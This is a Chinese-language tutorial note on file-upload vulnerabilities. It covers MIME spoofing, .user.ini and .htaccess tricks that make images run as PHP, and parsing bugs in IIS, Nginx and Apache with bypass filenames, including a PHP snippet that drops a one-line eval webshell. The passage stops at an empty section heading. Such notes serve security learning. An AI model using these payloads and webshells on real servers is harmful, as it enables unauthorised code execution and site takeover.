# File upload

[TOC]

# 原理

文件上传漏洞是指**文件上传功能**没有对上传的文件做合理严谨的**过滤**，导致用户可以利用此功能，上传能被**服务端解析执行的文件**（动态脚本文件），并通过此文件**获得执行服务端命令的能力**。

- 大部分站点都具有文件上传功能，例如：头像更改，文章编辑，附件上传等等

- 动态脚本文件可以是：木马，病毒，WebShell

- 文件上传的验证机制：

  - 服务端MIME类型验证

  - 服务端文件扩展名验证（ 黑名单、 白名单 ）

  - 服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）



# 验证的绕过

## MIME类型验证

MIME类型（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展）是一种标准，用于表示各种文件类型和内容类型。它最初是在电子邮件系统中定义的，但现在广泛应用于各种互联网协议，包括HTTP，用于指示浏览器或其他客户端如何处理接收到的数据。

**MIME类型的格式**为：`type/subtype`，其中`type`表示主类型，`subtype`表示子类型。

### 常见的MIME类型

1. 文本文件

- `text/plain`：纯文本文件
- `text/html`：HTML文件
- `text/css`：CSS样式表
- `text/javascript`：JavaScript文件

2. 图像文件

- `image/jpeg`：JPEG图片
- `image/png`：PNG图片
- `image/gif`：GIF图片
- `image/svg+xml`：SVG矢量图

3. 音频和视频文件

- `audio/mpeg`：MP3音频文件
- `audio/ogg`：OGG音频文件
- `video/mp4`：MP4视频文件
- `video/webm`：WEBM视频文件

4. 应用程序文件

- `application/json`：JSON数据
- `application/xml`：XML数据
- `application/pdf`：PDF文件
- `application/zip`：ZIP压缩文件
- `application/octet-stream`：二进制数据流（用于任意文件）

更多种类可以在**`mime.tpyes`**文件里面查看

遇到要验证`Content-Type`头部的，抓包修改MIME即可。例如，网站只接受`image/png`类型，就把后门文件的上传数据包里的`text/plain`改成`image/png`，实现绕过





## 文件名验证

### 修改上传配置文件

通过先上传配置文件，允许后门文件的上传。 

1. `.user.ini`文件

   `.user.ini` 文件通常用于共享主机环境中，在这种环境中用户无法直接访问全局配置文件`php.ini` 。但通过 `.user.ini` 文件，用户可以在没有服务器管理员权限的情况下自定义 PHP 配置。**限制：php**

   利用条件：

   当前目录有一个指向文件名。若没有直接显示目录，就需要先上传`index.php`(内容随意)来构造条件。 

   ```ini
   # 加载第一个php代码之后执行
   auto_append_file = "1.png"
   # 加载第一个php代码之前执行
   auto_prepend_file = "1.png"

2. `.htacess`文件

   `.htaccess` 文件是一种配置文件，通常用于Apache Web服务器中，允许对单个目录或文件进行特定的配置。它能实现URL重写、访问控制、错误页自定义、MIME类型设置等功能，而不需要修改全局的Apache配置文件。以下是一些常见的 `.htaccess` 配置示例及其用途。**限制：Apache**

   ```htaccess
   # 1. 虽然好用，但是会误伤其他正常文件，容易被发现
   <IfModule mime_module>
   AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
   SetHandler application/x-httpd-php   #在当前目录下，所有文件都会被解析成php代码执行
   </IfModule>
   # 2. 精确控制能被解析成php代码的文件，不容易被发现
   <FilesMatch "evil.gif">
   SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
   AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
   </FilesMatch>

### 文件名解析漏洞

文件解析漏洞主要由于网站管理员操作不当或者 Web 服务器自身的漏洞，导致一些特殊文件被 IIS、apache、nginx 或其他 Web服务器在某种情况下解释成脚本文件执行。

比如网站管理员配置不当，导致`php2`、`phtml`、`ascx`等等这些文件也被当成脚本文件执行了。甚至某些情况下管理员错误的服务器配置导致`.html`、`.xml`等静态页面后缀的文件也被当成脚本文件执行。

但是，大部分的解析漏洞还是由于web服务器自身的漏洞，导致特殊文件被当成脚本文件执行了。

#### IIS

##### 目录解析漏洞

**IIS5.x/6.0** 中，在网站下建立文件夹的名字为*`.asp`、*`.asa`、*`.cer`、*`.cdx` 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做`asp`文件来解释并执行。

```
/test.asp/1.jpg
```

##### 文件名解析漏洞

**IIS5.x/6.0** 中， 分号后面的不被解析，也就是说 `test.asp;.jpg` 会被服务器看成是`test.asp`。而有些网站对用户上传的文件进行校验，只是校验其后缀名。还有IIS6.0默认的可执行文件除了`asp`还包含这两种 `.asa` , `.cer` 。

```
1.asp;.jpg
```

##### 畸形解析漏洞

**IIS7.0** 中，在默认Fast-CGI开启状况下，向`1.jpg`里面写入代码:

```
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[x])?>')?>
```

假设上传路径为`/upload`，上传成功后，直接访问`/upload/1.jpg/*.php`，`1.jpg`将会被服务器当成`php`文件执行，所以图片里面的代码就会被执行。创建了一个一句话木马文件 `shell.php` 。

```
1.jpg/*.php
```

##### 其他解析漏洞

在windows环境下，**xx.jpg[空格]** 或 **xx.jpg.** 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。

黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。

#### Ngnix

##### 畸形解析漏洞

**Ngnix1.x** 中，同IIS的畸形解析漏洞，具体原因见：[文件解析漏洞总结（IIS,APACHE,NGINX） - yokan - 博客园 (cnblogs.com)](https://www.cnblogs.com/yokan/p/12444476.html)

##### 空字节解析漏洞

“%00”代表空字符（null character），在计算机系统中通常用于表示字符串的结束。

**Nginx 0.5.*** ，**Nginx 0.6.***，**Nginx 0.7 <= 0.7.65**，**Nginx 0.8 <= 0.8.37**中，Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致解析漏洞。

```
1.jpg%00.php
```

##### 文件名逻辑漏洞 CVE-2013-4547

**Nginx 0.8.41 ~ 1.5.6 **中，这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。

上传`‘1.jpg ’`到`/upload`，直接访问

```
/upload/1.jpg...php
```

抓包把前面两点的ASCII码`.[0x2e]`改成空格符` [0x20]`，截止符`[0x00]`

![1964477-20200308194656774-1403436835](C:/Users/12467/Pictures/md/1964477-20200308194656774-1403436835.png)

这样`‘1.jpg ’`就可以被当做php文件交给php去执行了。

#### Apache

##### 多后缀解析漏洞

Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。如果`.htaccess`文件的`AddHandler`配置不当

```htaccess
AddHandler application/x-httpd-php .php .phtml .pht .phar
AddHandler application/x-httpd-php3-preprocessed .php3p
AddHandler application/x-httpd-php-source .phps
AddHandler application/x-httpd-php3 .php3
AddHandler application/x-httpd-php4 .php4
AddHandler application/x-httpd-php5 .php5
```

Apache就会把`1.php3.owf.jpg`解析成`1.php3`

##### 换行解析漏洞 CVE-2017-15715

**Apache 2.4.0 ~ 2.4.29** 中，在解析php时`1.php\0a`将被安全.php后缀进行解析，导致绕过一些安全机制。

上传`‘1.php.’`到`/upload`，抓包把点的ASCII码`.[0x2e]`改成换行符`[0x0a]`

![1619541568_60883e4096007c5cc78f7](C:/Users/12467/Pictures/md/1619541568_60883e4096007c5cc78f7.png)

再访问

```
/upload/1.php%0a
```

就可以解析执行了





## 文件内容验证

